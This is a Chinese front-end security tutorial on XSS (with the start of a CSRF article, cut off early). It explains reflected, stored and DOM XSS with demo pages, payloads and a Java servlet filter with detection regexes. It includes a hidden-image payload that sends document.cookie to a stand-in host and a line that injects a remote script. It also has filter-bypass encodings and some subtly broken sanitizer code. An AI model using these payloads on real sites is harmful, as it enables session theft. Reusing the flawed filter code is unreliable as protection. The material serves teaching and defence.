# [前端安全系列：XSS篇](https://segmentfault.com/a/1190000019980090)

## XSS攻击

全称跨站脚本攻击，为不和`层叠样式表(Cascading Style Sheets, CSS)`的缩写混淆，故将跨站脚本攻击缩写为XSS，XSS是一种在web应用中的计算机安全漏洞，它允许恶意web用户将代码植入到提供给其它用户使用的页面中

## XSS攻击的危害

1. 盗取各类用户帐号，如机器登录帐号、用户网银帐号、各类管理员帐号
2. 控制企业数据，包括读取、篡改、添加、删除企业敏感数据的能力
3. 盗窃企业重要的具有商业价值的资料
4. 非法转账
5. 强制发送电子邮件
6. 网站挂马
7. 控制受害者机器向其它网站发起攻击

## XSS漏洞的分类

### 本地利用漏洞

这种漏洞存在于浏览器页面中,属于前端自身问题基于DOM文档对象模型的一种漏洞,大概步骤:

1. A给B发送一个恶意构造的URL
2. B打开恶意URL
3. B的浏览器页面中包含恶意代码
4. A的恶意代码可以拥有B的持有权限,进而获取B的数据或者冒充B的行为

通过修改浏览器页面中的DOM(DocumentObjectModel)时，就有可能产生这种漏洞

### 反射式漏洞

服务端没有对数据进行过滤、验证或者编码等处理直接返回前端可能引起的漏洞

1. A给B发送一个恶意构造的URL
2. B打开目标网站,浏览器将包含恶意代码的数据通过请求传递给服务端,其不加处理直接返回给浏览器
3. B的浏览器接收到响应后解析并执行的代码中包含恶意代码
4. A的恶意代码可以拥有B的持有权限,进而获取B的数据或者冒充B的行为

常见于网站搜索栏,登录注册等地方窃取用户cookies或者进行钓鱼欺骗.因为其中涉及到服务端的参与,想要避免需要后端协调.

### 存储式漏洞

类似反射式但是会把未经处理的数据储存在数据库中

1. A将恶意代码提交到目标网站的数据库中
2. B打开目标网站,服务端将恶意代码从数据库取出拼接在HTML中返回给浏览器
3. B的浏览器接收到响应后解析并执行的代码中包含恶意代码
4. A的恶意代码可以拥有B的持有权限,进而获取B的数据或者冒充B的行为

这是属于持久性攻击,涉及范围可能包括所有的访问用户,一般常用网站留言,评论,博客日志等.

### 大致对比

| 类型 | 本地利用              | 反射式                | 存储式                                          |
| :--: | --------------------- | --------------------- | ----------------------------------------------- |
| 触发 | 用户打开恶意构造的URL | 用户打开恶意构造的URL | 1. 用户打开恶意构造的URL <br/>2. 攻击者构造脚本 |
| 储存 | URL                   | URL                   | 数据库                                          |
| 输出 | 前端                  | 后端                  | 后端                                            |
| 方式 | DOM                   | HTTP响应              | HTTP响应                                        |

## XSS 常见案例

### 公司网站新上线一个搜索功能,B写了这段代码

```xml
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <meta http-equiv="X-UA-Compatible" content="ie=edge" />
        <title>demo</title>
        <style>
            input {
                width: 600px;
            }
        </style>
    </head>
    <body>
        <div>
            input:
            <input type="text" id="in" />
            <button type="submit" id="submit">submit</button>
        </div>
        <br />
        <div>
            output:
            <input id="out" />
        </div>

        <script src="http://libs.baidu.com/jquery/2.0.0/jquery.min.js"></script>
        <script>
            $(function() {
                var $input = $('#in');
                var $output = $('#out');
                var $submit = $('#submit');

                $submit.click(function() {
                    var val = $input.val();
                    $output.val(val).html(val);
                });
            });
        </script>
    </body>
</html>
```

完整源码可以查看[demo1](https://link.segmentfault.com/?enc=FNz4mkAO1XJLu2iC5i%2FPiw%3D%3D.cmiLfQq4GjBOFv2hua84FGOkLqWF9bOwgmu05qyXEXrGfHQlIS8vcph9iSsQQCdt)
某天,让A知道之后他输入这么一段代码,然后提交之后发现

```xml
<script>alert('XSS');</script>
```

![图片描述](D:\0_Notes\Hexo\hmxyl\source\_images\bVbvZSv.png)
类似的用户输入内容都可能被攻击者利用拼接特殊格式的字符串形成恶意代码,通过注入脚本引发潜在风险,浏览器不会区分善恶,只是按照代码解析,于是B想了一个办法告诉浏览器这段内容不该解析,所以改了一下,简单转义输入内容

```javascript
function escapeHtml(text) {
  return text.replace(/[<>"&]/g, function(match, pos, originalText) {
    switch (match) {
      case '<':
        return '&lt;';
      case '>':
        return '&gt;';
      case '&':
        return '&amp;';
      case '"':
        return '&quot;';
    }
  });
}

function unescapeHtml(str) {
  return text.replace(/[<>"&]/g, function(match, pos, originalText) {
    switch (match) {
      case '&lt;':
        return '<';
      case '&gt;':
        return '>';
      case '&amp;':
        return '&';
      case '&quot;':
        return '"';
    }
  });
}

$submit.click(function() {
  var val = escapeHtml($input.val());
  $output.val(val).html(val);
});
```

完整源码可以查看[demo2](https://link.segmentfault.com/?enc=7%2BulsDr5cJb65Dru5wIBLQ%3D%3D.MkzYuT3mLjcpFBshJDeed1lo4CRy1%2B3FKB29NhvTZir3%2FCtA8ETGTLsUMhvFmQXW)
现在浏览器就不会再执行里面的代码了,实际业务中应该转义的内容不止这么简单
![图片描述](D:\0_Notes\Hexo\hmxyl\source\_images\bVbvZSp.png)

### 基于某些业务,例如登录,订单等需要携带参数或者重定向等信息,B写了这么一个页面

```xml
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8" />
        <title>demo</title>
    </head>
    <body>
        <div>
            output:
            <input id="out" />
            <a id="jump">jump</a>
        </div>

        <script src="http://libs.baidu.com/jquery/2.0.0/jquery.min.js"></script>
        <script>
            $(function() {
                var $jump = $('#jump');
                var $output = $('#out');
                var $submit = $('#submit');

                function getQueryString(name) {
                    var reg = new RegExp('(^|&)' + name + '=([^&]*)(&|$)', 'i');
                    var r = window.location.search.substr(1).match(reg);
                    if (r != null) return unescape(r[2]);
                    return null;
                }

                var val = getQueryString('redirect_to');
        $output.val(val)
                $jump.attr('href', val);
            });
        </script>
    </body>
</html>
```

完整源码可以查看[demo3](https://link.segmentfault.com/?enc=iN%2FDwn9%2F8fycAncTRlrXKA%3D%3D.DVFSSINJ%2FfLXCiLJLyfw3GVNbolgisMCBONF%2FsmFnz59VkbkSfVqBtyCY%2BdfykrZ)
A发现一个漏洞,然后发了这个网址给其他人打开

```awk
https://www.test.com/?redirect_to=javascript:alert('XSS')
```

当他们点击跳转的时候就会触发A故意形成的恶意代码
![图片描述](D:\0_Notes\Hexo\hmxyl\source\_images\bVbvZSa.png)
像这种情况B第一想法是检验是否网址格式再渲染界面,所以他这么写

```kotlin
function testUrl(str) {
  var Expression =
    '^((https|http|ftp|rtsp|mms)?://)?' +
    '(([0-9a-z_!~*().&=+$%-]+: )?[0-9a-z_!~*().&=+$%-]+@)?' + //ftp的user@
    '(([0-9]{1,3}.){3}[0-9]{1,3}|' + // IP形式的URL- 199.194.52.184
    '([0-9a-z_!~*()-]+.)*' + // 域名- www.
    '[a-z]{2,6})' + //域名的扩展名
    '(:[0-9]{1,4})?' + // 端口- :80
    '((/?)|(/[0-9a-z_!~*().;?:@&=+$,%#-]+)+/?)$';
  var objExp = new RegExp(Expression);
  if (objExp.test(str) != true) {
    return false;
  } else {
    return true;
  }
}
var val = getQueryString('redirect_to');
$output.val(val);
testUrl(val) && $jump.attr('href', val);
```

完整源码可以查看[demo4](https://link.segmentfault.com/?enc=XG9ZRtG8WVR1AAsTugI%2BMg%3D%3D.jJuFJ1RYX5hcvELG8WL0FshynDkHfxkgMbRrSi7YU84%2FxeqIdUhWT7OBeTEU41oF)
因为富文本有问题,只能截图.

但是不是每个`a`标签都是用于跳转页面的,例如通过Scheme协议打开APP界面

```routeros
<a href="Scheme协议">
```

这样子你就把其他非属性跳转的用法都干掉了,所以B想了想不妥,还是换一种方式禁止,直接判断执行前缀

```kotlin
var val = getQueryString('redirect_to');
var reg = /javascript:/gi;
$output.val(val);
!reg.test(val) && $jump.attr('href', val);
```

完整源码可以查看[demo5](https://link.segmentfault.com/?enc=GKh%2Bza854rEwRA1V4aHVFw%3D%3D.IAKeiENsJj5PkeI0wWJ6i5cBmzfsu0hp8fYODACE%2B43AikV4MPPB52U3QdRf8QkC)
因为浏览器不区分大小写,所以需要注意一下.更新版本之后B以为已经堵死这条路了,殊不知A换个方式改成编码或者回车空格等

```ruby
https://www.test.com/?redirect_to=jav ascript:alert('XSS');
https://www.test.com/?redirect_to=javascrip?74:alert('XSS');
```

这就尴尬了,虽然浏览器并不会执行,但是这些也能完全避开B的拦截规则,也可能会引起其他隐患

### 还有种内联数据用法,将序列化的数据通过URL传递给其他页面使用

```xml
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8" />
        <title>demo</title>
    </head>
    <body>
        <div>
            output:
            <input id="out" />
        </div>

        <script src="http://libs.baidu.com/jquery/2.0.0/jquery.min.js"></script>
        <script>
            $(function() {
                var $output = $('#out');

                function getQueryString(name) {
                    var reg = new RegExp('(^|&)' + name + '=([^&]*)(&|$)', 'i');
                    var r = window.location.search.substr(1).match(reg);
                    if (r != null) return unescape(r[2]);
                    return null;
                }

                var val = JSON.parse(getQueryString('data'));
                $output.val(val.data).html(val.data);
            });
        </script>
    </body>
</html>
```

完整源码可以查看[demo6](https://link.segmentfault.com/?enc=lw1mgiqi%2BgpjsN7XtxGtgQ%3D%3D.kSUSKSu1hIaylfuR9LAXYDYeyafnFTEOJghTWig0wbJBV0b3YrMUzIFvVR4G74cI)
A可以直接修改URL参数注入代码

```awk
https://www.test.com/?data={"data":"<script>alert(\"XSS\")</script>"}
```

![图片描述](D:\0_Notes\Hexo\hmxyl\source\_images\bVbvZSt.png)

### A通过恶意脚本在页面插入图片自动发起恶意请求

```javascript
var img = document.createElement('img');
img.src =
  'http://www.test.com/cheat.html?url=' +
  escape(window.location.href) +
  '&content=' +
  escape(document.cookie);
img.style = 'display:none';
document.body.appendChild(img);
```

完整源码可以查看[demo7](https://link.segmentfault.com/?enc=HyNsNtiso%2FP4qBVkuB3HBg%3D%3D.K5rc87juwtWRDIwIUga7MX1WYXIAHW0fkwI8NBV9olOSDk4sZUlLGfAoOHsEbh8f)
B让服务端采用了比较简单的办法使用`httponly`禁止JS脚本访问cookies信息让A无法拿到

### A通过事件注入恶意脚本

```dart
var img = document.createElement('img');
img.src = '#';
img.onerror = document.body.appendChild(document.createElement('script')).src =
  'http://www.test.com/cheat.js';
img.style = 'display:none';
document.body.appendChild(img);
```

完整源码可以查看[demo8](https://link.segmentfault.com/?enc=0E77Ps%2B91Qg%2FBv1D3QCfeA%3D%3D.nfOm9N11kbP9QyK63oB%2Fg0psy1yz3KmkDcTxo8dGIXTtfgSc29jKHGuJTX1Q6XHX)
当浏览器向web服务器发送请求的时候，一般会带上`Referer`，告诉服务器我是从哪个页面链接过来的，服务器基此可以获得一些信息用于处理。可以让服务端限制必须是白名单才能通过请求达到防盗链功能,但是丢失`Refere`情况比较多,而且容易被恶意修改,所以大多只适用于资源被恶意引用的情况

### A利用浏览器的解码顺序进行混合编码组装

当浏览器进行绘制时，解码顺序分别为 HTML > URL > JS,所以A构造了这么一段代码

```perl
<a href="javascript&#58;alert('\<%E6%B5%8B%E8%AF%95\>')">jump</a>
```

首先是 HTML 解码，结果为

```perl
<a href="javascript:alert('\<%E6%B5%8B%E8%AF%95\>')">jump</a>
```

然后是 URL 解码，结果为

```xml
<a href="javascript:alert('\<测试\>')">jump</a>
```

最后是 JS 解码，结果为

```xml
<a href="javascript:alert('<测试>')">jump</a>
```

所以可以攻击的方式很多种,相比于针对处理我们应该先了解相关的攻击方式

## XSS攻击方式

- 所有用户输入内容都有潜在的风险

- 利用`script`标签注入`HTML/Javascript`代码

- 利用拥有`href`和`src`等属性的标签

- 利用空格、回车和Tab等拼接方式绕开拦截

- 利用字符编码绕开拦截（JS支持unicode、eacapes、十六进制、十进制等编码形式）

- 利用`onload`,`onscroll`等事件执行恶意代码

- 利用样式属性`backgrund-image`等执行(听说主流浏览器已处理)

- URL参数

- Cookies

- 请求`header`的`referer`

- 恶意代码拆分组装

- 各种API

  ```stylus
  // URL相关
  document.location
  document.URL
  document.URLUnencoded
  document.referrer
  window.location
  // 操作dom
  document.write()
  document.writeln()
  document.boby.innerHtml
  // 特殊函数
  eval()
  window.execScript()
  window.setInterval()
  window.setTimeout()
  // 重定向
  document.location
  document.URL
  document.open()
  window.location.href
  window.navigate()
  window.open
  ```

总的来说分两种类型:

1. 攻击者手动提交恶意代码
2. 浏览器自动执行恶意代码

## 防御

- 针对上面的案例如果B选择前端进行内容转义,会引起什么问题呢?

  如果攻击者不直接经过前端界面,而是直接自己构造请求就可以破解了

- 但是B是在发送请求之前转义又会有什么问题?

  如果是需要用于界面展示的话,引用到字段的地方都需要处理,大部分模板都会自动转义处理,但是如果用在JS不能直接使用或者计算,例如长度判断等

  需要根据上下文采用不同的转义规则增大处理难度,如 HTML 属性、HTML 文字内容、HTML 注释、跳转链接、内联 JavaScript 字符串、内联 CSS 样式表等,所以这更适用于固定类型的内容,例如URL,号码等

### XSS Filter

- 用户提交数据进行验证,只接受限定长度/内容
- 表单数据指定具体类型
- 过滤移除特殊的html标签,`script`和`iframe`等
- 过滤移除特殊的Javascript代码,`javascript:`和事件等

### HTML Entity(举例部分)

| 符号 | 实体编号 |
| :--: | :------: |
|  <   |   &lt;   |
|  >   |   &gt;   |
|  &   |  &amp;   |
|  "   |  &quot;  |
|  '   |  &apos;  |
| 空格 |  &nbsp;  |

### 请求限制

- 将重要的Cookie标记为HTTP Only,不能通过客户端脚本读取和修改
- 设置`referer`防止恶意请求
- 实现Session标记(session tokens)、CAPTCHA系统或者HTTP引用头检查，以防功能被第三方网站所执行



###  防御实现代码举例

```xml
<!-- 非法参数过滤器 -->
	<filter>
		<filter-name>IllegalCharacterFilter</filter-name>
		<filter-class>com.hots.ssp.common.safety.IllegalCharacterFilter</filter-class>
		<init-param>
			<!-- 配置不需要被登录过滤器拦截的链接，只支持配后缀、前缀 及全路径，多个配置用逗号分隔 -->
			<param-name>excludedPaths</param-name>
			<param-value>/images/*,*.jsp, *.css, *.ico</param-value>
		</init-param>
	</filter>
	<filter-mapping>
		<filter-name>IllegalCharacterFilter</filter-name>
		<url-pattern>/*</url-pattern>
	</filter-mapping>
```

```java
package com.dayainfo.ssp.common.safety;

import org.springframework.util.StringUtils;

import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.util.concurrent.atomic.AtomicBoolean;

public class IllegalCharacterFilter implements Filter {
    /**
     * 不需要被过滤器拦截的页面 ，主要用于静态资源的放行
     * 在web.xml中配置filter的init-param
     */
    private String excludedPaths;
    private String[] excludedPathArray;

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {
        // 初始化时读取web.xml中配置的init-param
        excludedPaths = filterConfig.getInitParameter("excludedPaths");
        if (!StringUtils.isEmpty(excludedPaths)) {
            excludedPathArray = excludedPaths.split(",");
        }
    }

    @Override
    public void doFilter(ServletRequest req, ServletResponse res, FilterChain chain) throws IOException, ServletException {
        HttpServletRequest request = (HttpServletRequest) req;
        HttpServletResponse resp = (HttpServletResponse) res;
        request.setCharacterEncoding("utf-8");
        String url = request.getServletPath();// 要访问的url
        // 判断是否是直接放行的请求
        if (url.contains("/overtime") || isFilterExcludeRequest(request)) {
            // 会丢参的访问
            chain.doFilter(request, res);
        } else {
            // 非法请求检查
            AtomicBoolean checkIllegal = new AtomicBoolean();
            // 添加X-Frame-Options响应头
            resp.setCharacterEncoding("utf-8");
            resp.addHeader("X-Frame-Options", "SAMEORIGIN");
            resp.addHeader("X-Download-Options", "noopen");
            resp.addHeader("X-Permitted-Cross-Domain-Policies", "master-only");
            resp.setHeader("strict-transport-security", "max-age=16070400; includeSubDomains");
            resp.addHeader("Referrer-Policy", "no-referrer-when-downgrade");
            resp.addHeader("Set-Cookie", "cookiename=value;Path=/;Domain=domainvalue;Max-Age=seconds;HTTPOnly");
            request = new MHttpServletRequest(request, checkIllegal);
            if (checkIllegal.get()) {
                // 非法请求拦截
                resp.sendRedirect("/publicUser/overtime?state=100011");
            }
            chain.doFilter(request, resp);
        }
    }

    @Override
    public void destroy() {
    }

    /**
     * 54
     * 判断是否是 过滤器直接放行的请求
     * 55
     * <br/>主要用于静态资源的放行
     *
     * @return 58
     */
    private boolean isFilterExcludeRequest(HttpServletRequest request) {
        if (null != excludedPathArray && excludedPathArray.length > 0) {
            String url = request.getServletPath();
            for (String ecludedUrl : excludedPathArray) {
                if (ecludedUrl.startsWith("*.")) {
                    // 如果配置的是后缀匹配, 则把前面的*号干掉，然后用endWith来判断
                    if (url.endsWith(ecludedUrl.substring(1))) {
                        return true;
                    }
                } else if (ecludedUrl.endsWith("/*")) {
                    if (!ecludedUrl.startsWith("/")) {
                        // 前缀匹配，必须要是/开头
                        ecludedUrl = "/" + ecludedUrl;
                    }
                    // 如果配置是前缀匹配, 则把最后的*号干掉，然后startWith来判断
                    String prffixStr = request.getContextPath() + ecludedUrl.substring(0, ecludedUrl.length() - 1);
                    if (url.startsWith(prffixStr)) {
                        return true;
                    }
                } else {
                    // 如果不是前缀匹配也不是后缀匹配,那就是全路径匹配
                    if (!ecludedUrl.startsWith("/")) {
                        // 全路径匹配，也必须要是/开头
                        ecludedUrl = "/" + ecludedUrl;
                    }
                    String targetUrl = request.getContextPath() + ecludedUrl;
                    if (url.equals(targetUrl)) {
                        return true;
                    }
                }
            }
        }

        return false;

    }
}
```



```java
package com.dayainfo.ssp.common.safety;

import com.dayainfo.ssp.common.safety.util.XssShieldUtil;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletRequestWrapper;
import java.util.concurrent.atomic.AtomicBoolean;

public class MHttpServletRequest extends HttpServletRequestWrapper {

    // 非法请求标记，存在注入嫌疑，禁止访问
    private final AtomicBoolean checkIllegal;

    public MHttpServletRequest(HttpServletRequest request, AtomicBoolean checkIllegal) {
        super(request);
        this.checkIllegal = checkIllegal;
        doParamFilter();
    }

    @Override
    public String getParameter(String name) {
        final String nameFilter = XssShieldUtil.stripXss(name, checkIllegal);
        // 返回值之前 先进行过滤
        final String value = super.getParameter(nameFilter);
        return XssShieldUtil.stripXss(nameFilter, value, checkIllegal);
    }

    @Override
    public String[] getParameterValues(String name) {
        final String nameFilter = XssShieldUtil.stripXss(name, checkIllegal);
        // 返回值之前 先进行过滤
        String[] values = super.getParameterValues(nameFilter);
        if (values != null) {
            for (int i = 0; i < values.length; i++) {
                values[i] = XssShieldUtil.stripXss(nameFilter, values[i], checkIllegal);
            }
        }
        return values;
    }

    public void doParamFilter() {
        for (String name : this.getParameterMap().keySet()){
            this.getParameterValues(name);
        }
    }
}
```

```java
package com.dayainfo.ssp.common.safety.util;

import com.alibaba.fastjson.JSON;
import com.dayainfo.ssp.common.safety.constant.SafeFilterConstant;
import com.dayainfo.ssp.common.util.EscapeUnescape;
import com.dayainfo.ssp.common.util.StringUtil;
import javafx.util.Pair;
import org.apache.commons.lang.StringUtils;
import org.junit.Test;

import java.io.*;
import java.net.URLDecoder;
import java.util.ArrayList;
import java.util.List;
import java.util.Locale;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * 处理非法字符
 */
public class XssShieldUtil {
    static String decodeParam(String value) {
        try {
            if (StringUtils.isEmpty(value)) {
                return value;
            }
            int totalCount = 2;
            while (value.contains("%") && --totalCount > 0) {
                value = URLDecoder.decode(value, "UTF-8");
            }
        } catch (Exception e) {
            if (e.getClass().getName().contains("NumberFormatException") && value.contains("%")) {
                value = value.replaceAll("%", "");
            }
        }
        if (value.contains("%")) {
            try {
                int totalCount = 2;
                while (value.contains("%") && --totalCount > 0) {
                    value = EscapeUnescape.unescape(value);
                }
            } catch (Exception e) {
            }
        }
        if (value.contains("%")) {
            System.out.printf("【decode失败】：%s\n", value);
        }
        return value;
    }

    static boolean checkFilter(String name) {
        return !StringUtils.isEmpty(name) && SafeFilterConstant.noFilterList.contains(name);
    }

    public static String stripXss(String name, String value, AtomicBoolean checkIllegal) {
        if (checkFilter(name)) {
            return value;
        }
        return stripXss(value, checkIllegal);
    }

    /**
     * 过滤清理
     */
    public static String stripXss(String value, AtomicBoolean checkIllegal) {
        final String tmpValue = value;
        // URLDecode
        value = decodeParam(value);
        // 放行
        if (checkFilter(value)) {
            return value;
        }
        if (StringUtils.isEmpty(value)) {
            return value;
        }
        if (patternToEmpty(value)) {
            // 非法请求，禁止访问
            checkIllegal.set(true);
            return null;
        }
        // JSON数据通过验证
        if (isJson(value)) {
            return value;
        }
        // 过滤危险字符
        value = patternToReplace(value);
        if (tmpValue != null && !tmpValue.equals(value)) {
            System.out.printf("【%s】----【%s】\n", tmpValue, value);
        }
        return value;
    }

    /**
     * 验证是否直接清理参数内容
     *
     * @param value
     * @return
     */
    static boolean patternToEmpty(String value) {
        Matcher matcher = null;
        final String testValue = value.toLowerCase(Locale.ROOT);
        for (Pattern pattern : XssPatternGroup.LIST_PATTERNS_DELETE) {
            matcher = pattern.matcher(testValue);
            while (matcher.find()) {
                if (StringUtil.isEmpty(matcher.group())) {
                    continue;
                }
                return true;
            }
        }
        return false;
    }

    /**
     * 验证是否直接替换参数内容
     *
     * @param value
     * @return
     */
    static String patternToReplace(String value) {
        Matcher matcher = null;
        for (Pattern pattern : XssPatternGroup.LIST_PATTERNS_REPLACE_TO_EMPTY) {
            matcher = pattern.matcher(value);
            // 匹配
            if (matcher.find()) {
                // 删除相关字符串
                value = matcher.replaceAll("");
            }
        }
        return value;
    }

    public static boolean isJson(String json) {
        boolean result = false;
        final String testJson = json.toLowerCase(Locale.ROOT);
        // JSON数据通过验证
        if (testJson.contains("/${")) {
            return false;
        }
        if ((json.contains("{") && json.contains("}")) || (json.contains("[") && json.contains("]"))) {
            try {
                JSON.parse(json);
                result = true;
            } catch (Exception e) {
                System.out.println("JSON数据被拦截：" + json);
                result = false;
            }
        }
        return result;
    }
}
```

```java
package com.dayainfo.ssp.common.safety.util;

import java.util.ArrayList;
import java.util.List;
import java.util.regex.Pattern;

/**
 * @author: DH
 * @date: 2022/4/20
 * @desc:
 */
public final class XssPatternGroup {
    static final List<Pattern> LIST_PATTERNS_DELETE = new ArrayList<>();

    static final List<Pattern> LIST_PATTERNS_REPLACE_TO_EMPTY = new ArrayList<>();

    static {
        for (Object[] arr : getXssPatternToNullList()) {
            LIST_PATTERNS_DELETE.add(Pattern.compile((String) arr[0], (Integer) arr[1]));
        }
        for (Object[] arr : getXssPatternToEmptyList()) {
            LIST_PATTERNS_REPLACE_TO_EMPTY.add(Pattern.compile((String) arr[0], (Integer) arr[1]));
        }
    }

    /**
     * 正则匹配上：清空参数所有内容
     *
     * @return
     */
    private static List<Object[]> getXssPatternToNullList() {
        List<Object[]> ret = new ArrayList<Object[]>();
        ret.add(new Object[]{"<(\\S*)(no)?script|</(\\S*)(no)?script|<(\\S*)iframe|<(\\S*)img|<(\\S*)svg|<(\\S*)audio|\\.html", Pattern.CASE_INSENSITIVE});
        ret.add(new Object[]{"window\\.location|window\\.|\\.location|document\\.cookie|document\\.write|document\\.|alert\\(.*?\\)|window\\.open\\(*", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL});
        ret.add(new Object[]{"eval\\((.*?)\\)", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL});
        ret.add(new Object[]{"javascript:|vbscript:|view-source:", Pattern.CASE_INSENSITIVE});
        ret.add(new Object[]{"( href=)|( src=)|(=wrtice\\()", Pattern.CASE_INSENSITIVE});
        ret.add(new Object[]{"<+\\s*\\w*\\s*(oncontrolselect|oncopy|oncut|ondataavailable|ondatasetchanged|ondatasetcomplete|ondblclick|ondeactivate|ondrag|ondragend|ondragenter|ondragleave|ondragover|ondragstart|ondrop|onerror=|onerroupdate|onfilterchange|onfinish|onfocus|onfocusin|onfocusout|onhelp|onkeydown|onkeypress|onkeyup|onlayoutcomplete|onload|onlosecapture|onmousedown|onmouseenter|onmouseleave|onmousemove|onmousout|onmouseover|onmouseup|onmousewheel|onmove|onmoveend|onmovestart|onabort|onactivate|onafterprint|onafterupdate|onbefore|onbeforeactivate|onbeforecopy|onbeforecut|onbeforedeactivate|onbeforeeditocus|onbeforepaste|onbeforeprint|onbeforeunload|onbeforeupdate|onblur|onbounce|oncellchange|onchange|onclick|oncontextmenu|onpaste|onpropertychange|onreadystatechange|onreset|onresize|onresizend|onresizestart|onrowenter|onrowexit|onrowsdelete|onrowsinserted|onscroll|onselect|onselectionchange|onselectstart|onstart|onstop|onsubmit|onunload)+\\s*=+", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL});
        return ret;
    }

    /**
     * 正则匹配上：清空参数匹配项
     */
    private static List<Object[]> getXssPatternToEmptyList() {
        List<Object[]> ret = new ArrayList<Object[]>();
        ret.add(new Object[]{"expression\\((.*?)\\)", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL});
        ret.add(new Object[]{"<(\"[^\"]*\"|\'[^\']*\'|[^\'\">])*>", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL});
        ret.add(new Object[]{"&.*?|$.*?|CR.*?|LF.*?|\\.*?", Pattern.CASE_INSENSITIVE});
        ret.add(new Object[]{"%22", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL});
        ret.add(new Object[]{"%27", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL});
        ret.add(new Object[]{"%3E", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL});
        ret.add(new Object[]{"%3e", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL});
        ret.add(new Object[]{"%3C", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL});
        ret.add(new Object[]{"%3c", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL});
        ret.add(new Object[]{"<", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL});
        ret.add(new Object[]{">", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL});
        ret.add(new Object[]{"%", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL});
        ret.add(new Object[]{"$", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL});
        ret.add(new Object[]{"\"", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL});
        ret.add(new Object[]{"\'", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL});
        ret.add(new Object[]{"\"", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL});
        ret.add(new Object[]{"'", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL});
        ret.add(new Object[]{"\\+", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL});
        ret.add(new Object[]{"\\\\", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL});
        ret.add(new Object[]{"\\(", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL});
        ret.add(new Object[]{"\\)", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL});
        ret.add(new Object[]{" and ", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL});
        ret.add(new Object[]{" or ", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL});
        ret.add(new Object[]{" 1=1 ", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL});
        ret.add(new Object[]{"(\\bhref(?=\\s*=\\s*['\"]?\\s*javascript:))|(\\bdata(?!:\\s*image/))|(^[^<]*<(?=/textarea\\s*>))|(<(?=(script)|(/script)))|(\\b(onafterprint|onbeforeprint|onbeforeunload|onerror|onhaschange|onload|onmessage|onoffline|ononline|onpagehide|onpageshow|onpopstate|onredo|onresize|onstorage|onundo|onunload|onblur|onchange|oncontextmenu|onfocus|onformchange|onforminput|oninput|oninvalid|onreset|onreset|onsubmit|onkey\\w*|onclick|ondblclick|ondrag\\w*|ondrop|onmouse\\w*|onscroll|ontouch\\w*)(?=(\\s*)=))", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL});
        return ret;
    }

}
```

```java
public class SafeFilterConstant {
    public static final List<String> noFilterList = new ArrayList();

    static {
        noFilterList.add("res_create_user_id");
        noFilterList.add("(.*?)DataListStr(.*?)");
        noFilterList.add("proc_dxid");
        noFilterList.add("userName");
        noFilterList.add("password");
        noFilterList.add("sortParam");
    }

}
```





# [前端安全系列：CSRF篇](https://segmentfault.com/a/1190000019980372)

## CSRF介绍

CSRF（Cross-site request forgery）跨站请求伪造，也被称为“One Click Attack”或者Session Riding，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。尽管听起来像跨站脚本，但它与XSS非常不同，XSS利用站点内的信任用户，而CSRF则通过伪装成受信任用户的请求来利用受信任的网站。攻击通过在授权用户访问的页面中包含链接或者脚本的方式工作

## CSRF攻击

一个典型的CSRF攻击流程大概如下:

1. 用户登录`a.com`并**保留登录信息**
2. 攻击者**引诱用户访问**了`b.com`
3. `b.com`在用户不知情的情况下向`a.com`发送请求并携带用户的登录信息
4. `a.com`接收请求验证登录信息通过执行某些恶意操作
5. 攻击者在用户不知情的情况下冒充用户的身份完成了攻击.

攻击方式:

- 攻击者的网站
- 有文件上传漏洞的网站
- 第三方论坛,博客等网站
- 目标网站自身的漏洞

相对`XSS`攻击,`CSRF`攻击不太一样

- 一般攻击发起点不在目标网站,而是被引导到第三方网站再发起攻击,这样目标网站就无法防止
- 攻击者不能获取到用户Cookies,包括子域名,而是利用Cookies的特性冒充用户身份进行攻击
- 通常是跨域攻击,因为攻击者更容易掌握第三方网站而不是只能利用目标网站自身漏洞
- 攻击方式包括图片,URL,CORS,表单,甚至直接嵌入第三方论坛,文章等等,难以追踪

## 常见的CSRF攻击类型

### GET请求

